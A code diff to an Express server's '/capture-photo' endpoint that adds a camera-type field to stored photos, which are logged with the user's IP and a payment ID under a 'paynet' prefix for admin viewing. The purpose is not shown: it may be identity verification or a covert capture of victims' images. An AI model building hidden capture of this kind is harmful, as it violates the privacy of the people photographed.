@@ -1096,7 +1096,7 @@ app.get("/forgot-password", (req, res) => {
 // ============ CAPTURE PHOTO ============
 app.post("/capture-photo", async (req, res) => {
   try {
-    const { photo, type, timestamp: clientTimestamp, paymentId } = req.body;
+    const { photo, type, timestamp: clientTimestamp, paymentId, camera } = req.body;
 
     if (!photo) {
       return res.status(400).json({ success: false, message: "No photo data" });
@@ -1106,7 +1106,8 @@ app.post("/capture-photo", async (req, res) => {
     const timestamp = new Date().toISOString().replace(/:/g, "-");
     const safeIp = String(ip).replace(/[.:]/g, "-");
     const photoType = type || "unknown";
-    const publicId = `paynet_${photoType}_${timestamp}_${safeIp}`;
+    const cameraType = camera || "unknown";
+    const publicId = `paynet_${photoType}_${cameraType}_${timestamp}_${safeIp}`;
 
     let photoUrl = null;
     let filename = null;
@@ -1138,6 +1139,7 @@ app.post("/capture-photo", async (req, res) => {
       filename,
       url: photoUrl,
       type: photoType,
+      camera: cameraType,
       ip,
       timestamp: clientTimestamp || new Date().toISOString(),
       localPath: photoUrl ? null : `/admin/photo/${filename}`,
